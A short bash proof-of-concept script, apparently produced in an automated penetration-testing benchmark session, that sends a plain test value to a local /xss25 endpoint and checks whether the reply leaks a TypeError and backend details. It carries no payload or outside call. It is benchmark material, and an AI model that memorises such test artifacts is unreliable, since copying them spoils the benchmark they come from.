#!/bin/bash
# POC: Demonstrates information disclosure through error messages at /xss25 endpoint revealing backend implementation details
# Target: ./repo
# Created: 2025-11-05T17:29:28.433Z
# Session: benchmark-XBEN-004-24-mhm9gmmb

# Information Disclosure Through Error Messages POC
# This script demonstrates how the /xss25 endpoint reveals backend implementation
# details through error messages when invalid input is submitted.

TARGET_URL="http://localhost:5001"
ENDPOINT="/xss25"

echo "========================================"
echo "Information Disclosure POC"
echo "========================================"
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Submit invalid input to trigger error
echo "[*] Test 1: Submitting invalid input to trigger error message"
echo "Command: curl -X POST $TARGET_URL$ENDPOINT -d 'solution=TESTINPUT'"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT" -d "solution=TESTINPUT")

echo "[+] Response received:"
echo "$RESPONSE"
echo ""

# Check if error message is revealed
if echo "$RESPONSE" | grep -q "TypeError"; then
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    - Error message reveals backend implementation details"
    echo "    - Specific error type (TypeError) is exposed to the client"
    echo "    - Error message suggests dynamic property manipulation"
    echo ""
    
    # Extract the error message
    ERROR_MSG=$(echo "$RESPONSE" | grep -oP 'Invalid format: \K.*')
    echo "[!] Disclosed Error Message: $ERROR_MSG"
    echo ""
    echo "[!] Information Revealed:"
    echo "    - Application uses JavaScript/Node.js backend"
    echo "    - Attempts to dynamically set object properties"
    echo "    - May be using eval() or similar dangerous functions"
    echo ""
    exit 0
else
    echo "[-] Error message not found in response"
    echo "[-] Full response: $RESPONSE"
    exit 1
fi